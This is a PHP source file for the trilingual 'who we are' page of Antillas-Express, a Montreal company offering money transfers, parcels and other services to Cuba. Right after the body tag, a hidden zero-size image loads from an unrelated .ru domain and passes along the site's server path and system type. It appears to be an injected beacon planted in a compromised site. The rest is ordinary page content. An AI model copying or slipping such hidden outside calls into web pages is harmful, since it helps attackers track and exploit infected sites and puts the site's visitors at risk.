<?php
include('lib/config.php');
InfoBannie( $ip );

echo "
<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//FR'>
<html  xmlns='http://www.w3.org/1999/xhtml'>
   <head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1' >
		<meta http-equiv='Content-Disposition' content='inline; filename=Liste de client' >
		<meta http-equiv='Content-Description' content='text/html; charset=iso-8859-1' >
		<meta name='author' content='$NomCieCréé' >
		<meta name='copyright' content='copyright © $CopyAn $NomCie' >
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table bgcolor='#EFEFEF' width='$Large' cellpadding='12' cellspacing='0' align='$Enligne' border='0' >		
		<tr>
			<td>";
?>

 <?if ($_SESSION['langue']=="fr"){?>
	<blockquote> 
              <p><span class="TitleRed"><br>
                Qui sommes-nous ? </span> </p>
              <p class="normalTextBold">&Eacute;tablie &agrave; Montr&eacute;al, 
                Antillas-Express offre des services financiers desservant Cuba 
                qui s&#8217;ajoutent &agrave; ses activit&eacute;s de livraison, 
                messagerie, communication et vente de produits de consommation 
                courante.</p>
              <p class="normalText">Nous avons d&eacute;velopp&eacute; une relation 
                d&#8217;affaires tr&egrave;s personnalis&eacute;e aupr&egrave;s 
                de la client&egrave;le depuis nos d&eacute;buts en 1993. Les transactions 
                s&#8217;effectuent de fa&ccedil;on rapide et s&eacute;curitaire. 
                Nous traitons directement avec les personnes que vous voulez rejoindre 
                dans toutes les r&eacute;gions de l&#8217;&icirc;le cubaine. Confidentialit&eacute; 
                et discr&eacute;tion sont assur&eacute;es.</p>
              <p class="normalText">En 2004, <span class="normalTextBold">Antillas-Expres</span>s 
                a lanc&eacute; une nouvelle version de son site Internet permettant 
                de r&eacute;aliser vos transactions en ligne en tout temps et 
                partout dans le monde. Vous pouvez &eacute;galement passer vos 
                commandes par t&eacute;l&eacute;phone, par t&eacute;l&eacute;copieur 
                ou par courriel. Notre service &agrave; la client&egrave;le se 
                fera un plaisir de r&eacute;pondre &agrave; vos besoins :</p>
              <p class="normalTextBold">Fonds</p>
              <ul>
                <li class="normalText">Envoi d&#8217;argent &agrave; domicile</li>
                <li class="normalText">Transfert d&#8217;argent &agrave; la banque</li>
              </ul>
              <p class="normalTextBold">Colis</p>
              <ul>
                <li class="normalText">Aliments</li>
                <li class="normalText">M&eacute;dicaments</li>
                <li class="normalText">Documents</li>
                <li class="normalText">Articles divers</li>
                <li class="normalText">Photos</li>
                <li class="normalText">Lettres</li>
              </ul>
              <p class="normalTextBold">Emplettes</p>
              <ul>
                <li class="normalText">Denr&eacute;es alimentaires</li>
                <li class="normalText">Produits pharmaceutiques</li>
                <li class="normalText">&Eacute;lectrom&eacute;nagers</li>
              </ul>
              <p class="normalTextBold">Cadeaux</p>
              <ul>
                <li class="normalText">Articles de luxe</li>
                <li class="normalText">Photographie</li>
                <li class="normalText">Service d&#8217;animation</li>
                <li class="normalText">Anniversaire</li>
                <li class="normalText">F&ecirc;te des m&egrave;res</li>
                <li class="normalText">No&euml;l</li>
                <li class="normalText">P&acirc;ques</li>
                <li class="normalText">Fian&ccedil;ailles</li>
                <li class="normalText">Mariage</li>
              </ul>
              <p class="normalTextBold">Communications</p>
              <ul>
                <li class="normalText">Envoi d&#8217;un message</li>
                <li class="normalText">Traduction </li>
                <li class="normalText">Appels internationaux</li>
              </ul>
              <p class="normalTextBold">Documents</p>
              <ul>
                <li class="normalText">Permis de s&eacute;jour &agrave; Cuba</li>
                <li class="normalText">Documents notari&eacute;s</li>
                <li class="normalText">Contrats</li>
              </ul>
				</blockquote>
<?} else if ($_SESSION['langue']=="en"){?>
				<blockquote> 
              <p><span class="TitleRed"><br>
                Who we are </span></p>
              <p><span class="normalTextBold">Settled down in Montreal, Antillas-Express 
                offers financial services toward Cuba as well as services of package 
                delivery, messaging, communications and sale of products of current 
                consumption.</span><span class="normalText"><br>
                <br>
                We have developed a business relationship personalized with our 
                customers from the beginnings in 1993. The transactions are made 
                in a quick and sure way. We treat directly with the people that 
                you want us to contact in all the regions of the Island of Cuba. 
                We assure discretion and confidentiality. <br>
                <br>
                In 2004, </span><span class="normalTextBold">Antillas-Express</span><span class="normalText"> 
                presents a new version of its Internet site allowing to carry 
                out on-line transactions in all moment and from all parts of the 
                world. You equally can request orders by phone, fax or e-mail. 
                Our Customer Service will respond with pleasure your questions 
                like: </span></p>
              <p><span class="normalTextBold">Fund</span></p>
              <ul>
                <li><span class="normalText">Money delivery to home</span></li>
                <li><span class="normalText">Transfer of money to bank </span></li>
                <li><span class="normalText">Transfer of money to a debit card 
                  </span></li>
              </ul>
              <p class="normalTextBold">Packages</p>
              <ul>
                <li><span class="normalText">Foods </span></li>
                <li><span class="normalText">Medicaments </span></li>
                <li><span class="normalText">Documents </span></li>
                <li><span class="normalText">Goods</span></li>
                <li><span class="normalText">Pictures </span></li>
                <li><span class="normalText">Letters </span></li>
              </ul>
              <p class="normalTextBold">Spread </p>
              <ul>
                <li><span class="normalText">Modules of foods </span></li>
                <li><span class="normalText">Pharmacy products </span></li>
                <li><span class="normalText">Appliances </span></li>
              </ul>
              <p class="normalTextBold">Gifts </p>
              <ul>
                <li><span class="normalText">Deluxe articles </span></li>
                <li><span class="normalText">Photographs </span></li>
                <li><span class="normalText">Service of animation Anniversary 
                  </span></li>
                <li><span class="normalText">Mothers' day </span></li>
                <li><span class="normalText">Christmas </span></li>
                <li><span class="normalText">Easter</span></li>
                <li><span class="normalText">Courtships </span></li>
                <li><span class="normalText">Marriages </span></li>
              </ul>
              <p class="normalTextBold">Communications </p>
              <ul>
                <li><span class="normalText">The send of a message </span></li>
                <li><span class="normalText">Translation </span></li>
                <li><span class="normalText">International calls </span></li>
              </ul>
              <p class="normalTextBold">Documents </p>
              <ul>
                <li><span class="normalText">Cuban Visit permit </span></li>
                <li><span class="normalText">Legal documents </span></li>
                <li><span class="normalText">Contracts</span></li>
              </ul>
            </blockquote>
<?} else {?>
				<blockquote> 
              <p><span class="TitleRed"><br>
                &iquest; Quienes somos ? </span> </p>
              <p class="normalTextBold">Establecida en Montreal, Antillas-Express 
                ofrece servicios financieros hacia Cuba que se adjuntan a sus 
                servicios de despacho de mercader&iacute;a, mensajer&iacute;a, 
                comunicaciones y venta de productos de consumo corrientes.</p>
              <p class="normalText">Hemos desarrollado una relaci&oacute;n de 
                negocio personalizada con nuestros clientes desde los comienzos 
                en 1993. Las transacciones se efect&uacute;an de manera r&aacute;pida 
                y segura. Tratamos directamente con las personas que Usted quiere 
                que contactemos en todas las regiones de la Isla de Cuba. Aseguramos 
                discreci&oacute;n y confidencialidad.</p>
              <p class="normalText"><br>
                En 2004, <span class="normalTextBold">Antillas-Express</span> 
                lanz&oacute; una nueva versi&oacute;n de su sitio Internet permitiendo 
                realizar transacciones en l&iacute;nea en todo momento y desde 
                todas partes del mundo. Usted puede igualmente solicitar sus pedidos 
                por tel&eacute;fono, fax o correo electr&oacute;nico. Nuestro 
                servicio a la clientela responder&aacute; con gusto sus inquietudes 
                en cuanto a:</p>
              <p class="normalText"><br>
                <span class="normalTextBold">Fondos</span></p>
              <ul>
                <li class="normalText">Env&iacute;o de dinero a domicilio</li>
                <li class="normalText"> Transferencia de dinero a banco</li>
                <li class="normalText">Transferencia de dinero a tarjeta de d&eacute;bito</li>
              </ul>
              <p class="normalTextBold">Paqueter&iacute;a</p>
              <ul>
                <li class="normalText">Alimentos</li>
                <li class="normalText">Medicamentos</li>
                <li class="normalText">Documentos</li>
                <li class="normalText">Art&iacute;culos diversos</li>
                <li class="normalText">Fotos</li>
                <li class="normalText">Cartas</li>
              </ul>
              <p class="normalTextBold">Tienda</p>
              <ul>
                <li class="normalText">M&oacute;dulos de alimentos</li>
                <li class="normalText">Productos de farmacia</li>
                <li class="normalText">Electrodom&eacute;sticos</li>
              </ul>
              <p class="normalText">Regalos</p>
              <ul>
                <li class="normalText">Art&iacute;culos de lujo</li>
                <li class="normalText">Fotograf&iacute;a</li>
                <li class="normalText">Servicio de animaci&oacute;n</li>
                <li class="normalText">Aniversario</li>
                <li class="normalText">Fiesta de las madres</li>
                <li class="normalText">Navidad</li>
                <li class="normalText">Pascuas</li>
                <li class="normalText">Noviazgos</li>
                <li class="normalText">Casamientos</li>
              </ul>
              <p class="normalTextBold">Comunicaciones</p>
              <ul>
                <li class="normalText">Env&iacute;o de un mensaje</li>
                <li class="normalText">Traducci&oacute;n </li>
                <li class="normalText">Llamadas internacionales</li>
              </ul>
              <p class="normalTextBold">Documentos</p>
              <ul>
                <li class="normalText">Permiso de visita a Cuba</li>
                <li class="normalText">Documentos legales</li>
                <li class="normalText">Contratos</li>
              </ul>
            </blockquote>
                  <?}?>

			</td>
		</tr>
	  	<tr> 
	    	<td>
				<?php include("bas_page.inc"); ?>
			</td>
	  	</tr>
	</table>
<script language='JavaScript1.2'>
	function Rafraichie(){
		window.location.reload();
		//	 open( 'qui_sommes_nous.php', '_self','status=no,toolbar=no,menubar=no,location=no,resizable=no' );
	} // Rafraichie
</script>

</body>
</html>
